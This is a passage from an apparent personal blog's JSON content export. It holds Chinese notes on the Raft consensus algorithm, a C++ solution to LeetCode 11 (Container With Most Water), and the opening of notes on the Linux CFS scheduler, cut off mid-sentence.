append</li>\n<li>如果两个日志在相同的索引位置的日志条目的任期号相同，那么我们就认为这个日志从头到这个索引位置之间全部完全相同</li>\n<li>leader完全特性：如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有领导人中（5.4 节）</li>\n<li>如果一个领导人已经在给定的索引值位置的日志条目应用到状态机中，那么其他任何的服务器在这个索引位置不会提交一个不同的日志</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"服务器状态\"><a href=\"#服务器状态\" class=\"headerlink\" title=\"服务器状态\"></a>服务器状态</h5><ul>\n<li>在所有服务器上持久化的<ul>\n<li>server最后一次知道的任期号（初始为0，单调递增）</li>\n<li>votedFor 获得选票的候选人ID（之所以需要持久化，是为了避免投票过程中宕机，导致宕机前后投了两次票，从而使得选举的“唯一领导人”特性被破坏）</li>\n<li>日志条目list（每个日志条目包含一个用户状态机执行的指令、收到时的任期号，每个日志条目在该list中的index是日志索引位置？）</li>\n</ul>\n</li>\n<li>在所有服务器中经常变的 <ul>\n<li>已知的最大的已经被提交的日志条目的索引值</li>\n<li>最后被应用到状态机的日志条目索引值(初始化为 0,持续递增)</li>\n</ul>\n</li>\n<li>在领导人里经常改变的 (选举后重新初始化)<ul>\n<li>对于每一个服务器,需要发送给他的下一个日志条目的索引值(初始化为领导人最后索引值加一)</li>\n<li>对于每一个服务器,已经复制给他的日志的最高索引值</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"任期\"><a href=\"#任期\" class=\"headerlink\" title=\"任期\"></a>任期</h5><ul>\n<li>任期在 Raft 算法中充当逻辑时钟的作用，这会允许服务器节点查明一些过期的信息比如陈旧的领导者</li>\n<li>每一个节点存储一个当前任期号，这一编号在整个时期内单调的增长</li>\n<li>当服务器之间通信的时候会交换当前任期号</li>\n<li>如果一个服务器的当前任期号比其他人小，那么他会更新自己的编号到较大的编号值</li>\n<li>如果一个候选人或者领导者发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求</li>\n<li>任期号是单调递增的： 新leader的任期号一定比旧的任期号大。旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选</li>\n</ul>\n<h5 id=\"选举\"><a href=\"#选举\" class=\"headerlink\" title=\"选举\"></a>选举</h5><ul>\n<li>最开始启动时，server以follower的身份启动</li>\n<li>如果超时没有收到心跳（选举超时，通常是100ms~500ms，每台服务器都会随机的计算下次超时的间隔时间，这个时间间隔在<code>[T, 2T]</code>之间。T代表着选举超时的时间，即服务器可能出现超时的最短时间）。那么进入选举过程</li>\n<li>拉票过程<ul>\n<li>变为candidate</li>\n<li>增大任期号（所以旧的leader复活也不能恢复旧时代）</li>\n<li>投票给自己、发拉票rpc给所有其他人（不断重试直到收到响应）直到成为leader/收到心跳/超时从而重试</li>\n<li>一旦候选人赢得选举，他就立即成为领导人。然后他会向其他的服务器发送心跳消息来建立自己的权威并且阻止新的领导人的产生</li>\n<li>等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加日志项RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次RPC中的任期号比自己小，那么候选人就会拒绝这次的RPC并且继续保持候选人状态</li>\n<li>出现分票时，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举</li>\n<li>通过以下手段使得不会无限分票<ul>\n<li>广播时间（广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间）必须比选举超时时间小一个量级,这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态</li>\n<li>随机化超时时间 </li>\n</ul>\n</li>\n</ul>\n</li>\n<li>拉票RPC包括：候选人的任期号、候选人的id、候选人的最后日志条目的索引值、候选人最后日志条目的任期号<ul>\n<li>一个问题，索引值和任期号相同，那么日志内容就一定相同吗？</li>\n<li>我认为<ul>\n<li>因为数据都从领导人流向其他服务器，所以某服务器在该位置上有这样一条这个任期号的日志，必然是因为有这个任期号的leader传给它的，而领导人绝不删除或覆盖自己的日志，所以日志内容是确定的</li>\n<li>如果出现该leader还没有comment该日志就下台，也不会出问题，因为新的leader的任期号必然比旧leader的大</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>投票过程<ul>\n<li>每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则</li>\n<li>RPC 中包含了候选人的日志信息,然后投票人会拒绝掉那些日志没有自己新的投票请求。（“新的”定义：(<code>lastterm_me &lt; lastterm_ca || (lastterm_me == lastterm_ca &amp;&amp; lastindex_me &lt;= lastindex_ca))</code>）</li>\n<li>拉票时，通过日志的完整、新旧程度来判断是否投票给某候选人，所以即使某服务器已收到term-4的leader发来的term-2的log，其还是会将票投给term-3的候选人（这样导致了“新leader复制旧日志使之分布到大多数node上时依然不能提交”）</li>\n</ul>\n</li>\n<li>安全：保证某任期一定有一个leader，方法是保证某次投票只投给一人，所以需要server持久化自己的投票信息，保证不重复投票</li>\n<li>可用：保证一定会选出leader。通过随机化超时时间来保证</li>\n<li>Raft使用投票的方式来阻止一个候选人赢得选举除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点,这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新, 那么他一定持有了所有已经提交的日志条目</li>\n<li>新leader的任期号一定比旧的任期号大：旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选</li>\n</ul>\n<h5 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h5><ul>\n<li>每台server都有日志副本</li>\n<li>日志被分为多条记录（entries），由下标索引唯一标示</li>\n<li>记录包含：一条命令、任期号（该记录创建时，leader的任期号，单调上升）</li>\n<li>如果日志是已提交的，则可以安全的传递给状态机去执行</li>\n<li>日志的索引和任期号的组合可以唯一标示一条日志记录</li>\n<li>发起追加日志调用时，除了新创建的新日志记录，还包括当前新记录的index和term号。从而通过数学归纳法保证如果某entries与leader的该entries是相同的，那么这条记录之前的所有记录都是匹配的</li>\n<li>附加日志RPC中包含leader的commitIdx，follower把自己的commitIdx更新为leader的commitIdx与自己的日志Idx中较小的一个。并且在commitIdx大于自己的lastApplyIdx时apply日志</li>\n<li>一致性检查：如果日志在 prevLogIndex 位置处的日志条目的任期号和 prevLogTerm 不匹配,则返回false。如果已经存在的日志条目和新的产生冲突(索引值相同但是任期号不同),删除这一条和之后所有的</li>\n<li>利用RPC一致性检查，就可以使得follower与leader的日志逐渐趋同——leader会在一致性检查失败时重试，使得最终nextIndex在某个位置leader与follower的日志达成一致</li>\n<li>一致性检查就像一个归纳步骤: 一开始空的日志状态肯定是满足日志匹配特性的, 然后一致性检查保护了日志匹配特性当日志扩展的时候。</li>\n<li>领导人崩溃的情况会使得日志处于不一致的状态(老的领导人可能还没有完全复制所有的日志条目)。这种不一致问题会在领导人和跟随者的一系列崩溃下加剧</li>\n<li>领导人处理不一致是通过强制跟随者直接复制自己的日志来解决了。这意味着在跟随者中的冲突的日志条目会被领导人的日志覆盖</li>\n<li>如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录</li>\n<li>当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号</li>\n<li>日志提交<ul>\n<li>领导人来决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为已提交</li>\n<li>在领导人将创建的日志条目复制到大多数的服务器上的时候，日志条目就会被提交</li>\n<li>同时，领导人的日志中之前的所有日志条目也都会被提交，包括由其他领导人创建的条目</li>\n</ul>\n</li>\n<li>需要限制<ul>\n<li>这一限制保证了任何的领导人对于给定的任期号，都拥有了之前任期的所有被提交的日志条目</li>\n<li>Raft永远不会通过计算副本数目的方式去提交一个之前任期内的日志条目。只有领导人当前任期里的日志条目通过计算副本数目可以被提交；一旦当前任期的日志条目以这种方式被提交，那么由于日志匹配特性，之前的日志条目也都会被间接的提交</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"服务过程\"><a href=\"#服务过程\" class=\"headerlink\" title=\"服务过程\"></a>服务过程</h5><ul>\n<li>客户端的每一个请求都包含一条被复制状态机执行的指令</li>\n<li>领导人把这条指令作为一条新的日志条目附加到日志中去，然后并行的发起附加条目 RPCs 给其他的服务器，让他们复制这条日志条目</li>\n<li>这条日志条目被安全的复制，领导人会应用这条日志条目到它的状态机中然后把执行的结果返回给客户端</li>\n<li>如果跟随者崩溃或者运行缓慢，再或者网络丢包，领导人会不断的重复尝试附加日志条目 RPCs （尽管已经回复了客户端）直到所有的跟随者都最终存储了所有的日志条目。</li>\n</ul>\n<h5 id=\"可用性\"><a href=\"#可用性\" class=\"headerlink\" title=\"可用性\"></a>可用性</h5><ul>\n<li>选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行。当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用</li>\n</ul>\n<h5 id=\"安全性\"><a href=\"#安全性\" class=\"headerlink\" title=\"安全性\"></a>安全性</h5><ul>\n<li>如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令</li>\n<li>覆盖日志的风险<ul>\n<li>如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录</li>\n<li>当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号</li>\n<li>所以如果某条前任的日志被当前leader复制到大多数机器上，另外的机器（没有这条日志）依然有可能被选为leader，因为该server的日志可以被老日志新（虽然比当前leader老）（论文中的图8）</li>\n<li>解决方法：一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。一旦当前任期的日志条目以这种方式被提交,那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交(例如，该条目是否存储到所有服务器上）</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"Raft读取\"><a href=\"#Raft读取\" class=\"headerlink\" title=\"Raft读取\"></a>Raft读取</h5><ul>\n<li><a href=\"https://pingcap.com/blog-cn/lease-read/\" target=\"_blank\" rel=\"noopener\">Ref from</a></li>\n<li>方法一：就像写入一样，走一遍raft log，这个log commit、apply后就可能拿到最新的值了</li>\n<li>方法二：ReadIndex Read<ul>\n<li>将当前⾃⼰的 commit index 记录到⼀个 local 变量 ReadIndex ⾥⾯<ul>\n<li>我的想法：对于用户来说，只能期待写入后的读取读到“刚刚写入的值”，而不能期待读到“读取时写入的值”。所以即使保存该commit index后有新的写入到来，commit index增大，依然没有问题（TODO，待求证）</li>\n</ul>\n</li>\n<li>向其他节点发起⼀次 heartbeat，如果⼤多数节点返回了对应的 heartbeat response，那么 leader 就能够确定现在⾃⼰仍然是 leader</li>\n<li>Leader 等待⾃⼰的状态机执⾏，直到 apply index 超过了 ReadIndex，这样就能够安全的提供 linearizable read 了</li>\n<li>Leader 执⾏ read 请求，将结果返回给 client</li>\n<li>corner case<ul>\n<li>leader 刚通过选举成为 leader 的时候，这时候的 commit index 并不能够保证是当前整个系统最新的 commit index</li>\n<li>Raft要求当 leader 选举成功之后，⾸先提交⼀个 no-op 的 entry，保证leader 的 commit index 成为最新的</li>\n<li>因为 leader 在选举成功之后，term ⼀定会增加，在处理 ReadIndex 的时候，如果当前最新的 commit log 的 term 还没到新的 term，就会⼀直等待跟新的 term ⼀致，也就是 no-op entry 提交之后，才可以对外处理ReadIndex（幸好有一个no-op的写入，不然这个读就得等到有新的写入完成才能读取成功）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>方法三：Lease Read<ul>\n<li>leader 发送 heartbeat 的时候，会⾸先记录⼀个时间点 start，当系统⼤部分节点都回复了 heartbeat response，那么我们就可以认为 leader 的 lease 有效期可以到 start + election timeout / clock drift bound 这个时间点</li>\n<li>主要是在于 Raft 的选举机制，因为 follower 会在⾄少election timeout 的时间之后，才会重新发⽣选举，所以下⼀个 leader 选出来的时间⼀定可以保证⼤于 start + election timeout / clock drift bound </li>\n<li>面临风险：CPU时间不准从而出错</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"需要可靠硬盘\"><a href=\"#需要可靠硬盘\" class=\"headerlink\" title=\"需要可靠硬盘\"></a>需要可靠硬盘</h5><ul>\n<li>需要可靠保存任期号</li>\n<li>保证某次选举时只将票投给一个server（如果没有可靠保存任期号，则有可能在选举过程中宕机又恢复的server会两次投票——一次宕机前，一次恢复后）</li>\n<li>需要可靠保存日志</li>\n<li>我认为，“需要可靠硬盘”与“硬盘可以损坏”并不冲突，因为我们在硬盘下线后上线时，可以使用checksum等工具，来判定硬盘是否损坏，如果损坏，那么不让其上线即可</li>\n</ul>\n<h5 id=\"优化\"><a href=\"#优化\" class=\"headerlink\" title=\"优化\"></a>优化</h5><ul>\n<li>当附加日志RPC的请求被拒绝的时候（因为一致性检查失败），跟随者可以包含冲突的条目的任期号和自己存储的那个任期的最早的索引地址。借助这些信息,领导人可以减小 nextIndex越过所有那个任期冲突的所有日志条目;这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次</li>\n<li>follower read （TODO）</li>\n</ul>\n<h5 id=\"具体情况分析\"><a href=\"#具体情况分析\" class=\"headerlink\" title=\"具体情况分析\"></a>具体情况分析</h5><ul>\n<li>某server一直收不到回复，从而假定出现分票，从而新开一个任期来选举，而他刚开始选举时，就收到上一次投票时的获胜者的心跳，会发生什么？<ul>\n<li>因为对于心跳RPC，如果term &lt; currentTerm就返回 false，并且心跳RPC的返回值有这个follower的当前任期号，所以leader会成为follower<blockquote>\n<p>如果接收到的RPC请求或响应中，任期号T&gt;currentTerm，那么就令currentTerm等于T，并切换状态为跟随者</p>\n</blockquote>\n</li>\n<li>只是这里有一个问题，候选人收到心跳RPC也是按照follower那样回复吗，论文上的表述是“接收者实现:”，而不是“follower实现”（第5节开头时关于附加日志RPC的介绍那里）</li>\n</ul>\n</li>\n<li>如何获得全局有效的任期号？这是个坏的问题。</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>如果心跳收不到响应怎么办？论文中没有提到</li>\n</ul>\n","slug":"my-raft-log","categories":[{"name":"分布式","slug":"分布式","permalink":"https://h-zex.github.io/categories/分布式/"},{"name":"算法","slug":"分布式/算法","permalink":"https://h-zex.github.io/categories/分布式/算法/"}],"tags":[{"name":"Raft","slug":"Raft","permalink":"https://h-zex.github.io/tags/Raft/"},{"name":"共识算法","slug":"共识算法","permalink":"https://h-zex.github.io/tags/共识算法/"},{"name":"分布式","slug":"分布式","permalink":"https://h-zex.github.io/tags/分布式/"}]},{"title":"LeetCode 11.Container With Most Water","date":"2019-07-02T15:43:51.993Z","path":"2019/07/02/LeetCode-11-Container-With-Most-Water/","text":"$O(NlgN)$解法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * 思路： * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置 * 方法是递推 * 首先，map是红黑树实现的，所以其是有序的 * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里 * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。 * 既然q大于等于p并且在左边，那么p的result应该是q */class Solution &#123; private: typedef pair&lt;int, int&gt; PII; multimap&lt;int, PII, greater&lt;int&gt;&gt; tree; multimap&lt;int, PII, greater&lt;int&gt;&gt; rtree; void ct(const vector&lt;int&gt; &amp;height) &#123; int i = 1; for (auto it = height.begin(); it != height.end(); ++it, ++i) &#123; auto p = tree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != tree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; void crt(const vector&lt;int&gt; &amp;height) &#123; int i = height.size(); for (auto it = height.rbegin(); it != height.rend(); ++it, --i) &#123; auto p = rtree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != rtree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; public: int maxArea(vector&lt;int&gt; &amp;height) &#123; ct(height); crt(height); int ans = -1; for (auto it = tree.begin(); it != tree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second); ans = ans &lt; p ? p : ans; &#125; for (auto it = rtree.begin(); it != rtree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first); ans = ans &lt; p ? p : ans; &#125; return ans; return 0; &#125;&#125;;","raw":"---\ntitle: LeetCode 11.Container With Most Water\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-07-20-21:40:30\ntags:\n- Leetcode\n- ACM\ndescription: solution\ncategories:\n- 算法\n---\n\n## $O(NlgN)$解法\n\n```cpp\n/*\n * 思路：\n * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置\n * 方法是递推\n * 首先，map是红黑树实现的，所以其是有序的\n * 然后，每次求出第i根柱子后，把 <height[i], <i, result>> push到map里\n * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height\n * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result\n * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。\n * 既然q大于等于p并且在左边，那么p的result应该是q\n */\nclass Solution {\n  private:\n    typedef pair<int, int> PII;\n    multimap<int, PII, greater<int>> tree;\n    multimap<int, PII, greater<int>> rtree;\n    void ct(const vector<int> &height) {\n        int i = 1;\n        for (auto it = height.begin(); it != height.end(); ++it, ++i) {\n            auto p = tree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != tree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n    void crt(const vector<int> &height) {\n        int i = height.size();\n        for (auto it = height.rbegin(); it != height.rend(); ++it, --i) {\n            auto p = rtree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != rtree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n\n  public:\n    int maxArea(vector<int> &height) {\n        ct(height);\n        crt(height);\n        int ans = -1;\n        for (auto it = tree.begin(); it != tree.end(); ++it) {\n            int p = (it->first) * (it->second.first - it->second.second);\n            ans = ans < p ? p : ans;\n        }\n        for (auto it = rtree.begin(); it != rtree.end(); ++it) {\n            int p = (it->first) * (it->second.second - it->second.first);\n            ans = ans < p ? p : ans;\n        }\n        return ans;\n        return 0;\n    }\n};\n```\n","content":"<h2 id=\"O-NlgN-解法\"><a href=\"#O-NlgN-解法\" class=\"headerlink\" title=\"$O(NlgN)$解法\"></a>$O(NlgN)$解法</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * 思路：</span></span><br><span class=\"line\"><span class=\"comment\"> * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置</span></span><br><span class=\"line\"><span class=\"comment\"> * 方法是递推</span></span><br><span class=\"line\"><span class=\"comment\"> * 首先，map是红黑树实现的，所以其是有序的</span></span><br><span class=\"line\"><span class=\"comment\"> * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height</span></span><br><span class=\"line\"><span class=\"comment\"> * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result</span></span><br><span class=\"line\"><span class=\"comment\"> * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。</span></span><br><span class=\"line\"><span class=\"comment\"> * 既然q大于等于p并且在左边，那么p的result应该是q</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> pair&lt;<span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>&gt; PII;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; tree;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; rtree;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ct</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.begin(); it != height.end(); ++it, ++i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = tree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != tree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">crt</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = height.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.rbegin(); it != height.rend(); ++it, --i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = rtree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != rtree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">maxArea</span><span class=\"params\">(<span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        ct(height);</span><br><span class=\"line\">        crt(height);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> ans = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = tree.begin(); it != tree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = rtree.begin(); it != rtree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","slug":"LeetCode-11-Container-With-Most-Water","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://h-zex.github.io/tags/Leetcode/"}]},{"title":"My Linux Note","date":"2019-05-01T02:22:59.000Z","path":"2019/05/01/My-Linux-Note/","text":"Linux调度 linux内核设计与实现第4章 不同进程有不同的调度算法（这种模块化结构称为调度器类）。每个调度器都有一个优先级，不同调度器之间如何协调？拥有一个可执行进程的最高优先级的调度器会胜出，去选择接下来要执行那个进程（The highest priority scheduler class that has a runnable process wins, selecting who runs next.） CFS 从Linux2.6.23开始引入 针对普通进程的调度器类（Linux中称为SCHED_NORMAL，POSIX称为SCHED_OTHER） 基于一个简单的理念：每个进程都能获得1/n的处理器时间（n是可运行的进程数量），任何可测量的周期内都是1/n（一个先运行5ms，另一个运行5ms是不满足这个理念的，要做到好像他们在10ms内同时运行，各自使用了一半的处理器能力） Ref: https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf Approximate fair scheduling. Run each process once per schedule latency period(就是sched_latency_ns，用sysctl -a可以看到). Time slice for process Pi: T * Wi/(Sum of all Wi) Too many processes? Lower bound on smallest time slice. Schedule latency = lower bound * number of procs Pick proc with weighted minimum runtime so far Virtual runtime: task-&gt;vruntime += executed time / Wi Red-black tree, Balanced binary search tree, Ordered by vruntime as key, O(lgN) insertion, deletion, update, O(1): find min(min_vruntime caches smallest value) Update vruntime and min_vruntime: When task is added or removed, On every timer tick, context switch Converting nice level to weight(): static const int prio_to_weight[40] (sched.h), Nice level changes by 1-&gt;10% weight.(Pre-computed to avoid Floating point operations, Runtime overhead)(In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process., 来自sched和nice的的manual)123456789101112131415161718192021222324&gt; // from https://elixir.bootlin.com/linux/v3.4/source/kernel/sched/sched.h#L804&gt; /*&gt; * Nice levels are multiplicative, with a gentle 10% change for every&gt; * nice level changed. I.e. when a CPU-bound task goes from nice 0 to&gt; * nice 1, it will get ~10% less CPU time than another CPU-bound task&gt; * that remained on nice 0.&gt; *&gt; * The \"10% effect\" is relative and cumulative: from _any_ nice level,&gt; * if you go up 1 level, it's -10% CPU usage, if you go down 1 level&gt; * it's +10% CPU usage. (to achieve that we use a multiplier of 1.25.&gt; * If a task goes up by ~10% and another task goes down by ~10% then&gt; * the relative distance between them is ~25%.)&gt; */&gt; static const int prio_to_weight[40] = &#123;&gt; /* -20 */ 88761, 71755, 56483, 46273, 36291,&gt; /* -15 */ 29154, 23254, 18705, 14949, 11916,&gt; /* -10 */ 9548, 7620, 6100, 4904, 3906,&gt; /* -5 */ 3121, 2501, 1991, 1586, 1277,&gt; /* 0 */ 1024, 820, 655, 526, 423,&gt; /* 5 */ 335, 272, 215, 172, 137,&gt; /* 10 */ 110, 87, 70, 56, 45,&gt; /* 15 */ 36, 29, 23, 18, 15,&gt; &#125;;&gt; Hierarchical, modular scheduler 123456789101112&gt; class = sched_class_highest;&gt; for (;;) &#123;&gt; p = class-&gt;pick_next_task(rq);&gt; if (p)&gt; return p;&gt; /*&gt; * Will never be NULL as the idle class always&gt; * returns a non-NULL p:&gt; */&gt; class = class-&gt;next;&gt; &#125;&gt; Ref: SUSE-doc-Tuning the Task Scheduler sched_latency_nsTargeted preemption latency for CPU bound tasks. Increasing this variable increases a CPU bound task’s timeslice. A task’s timeslice is its weighted fair share of the scheduling period: timeslice = scheduling period * (task’s weight/total weight of tasks in the run queue) The task’s weight depends on the task’s nice level and the scheduling policy. Minimum task weight for a SCHED_OTHER task is 15, corresponding to nice 19. The maximum task weight is 88761, corresponding to nice -20. Timeslices become smaller as the load increases. When the number of runnable tasks 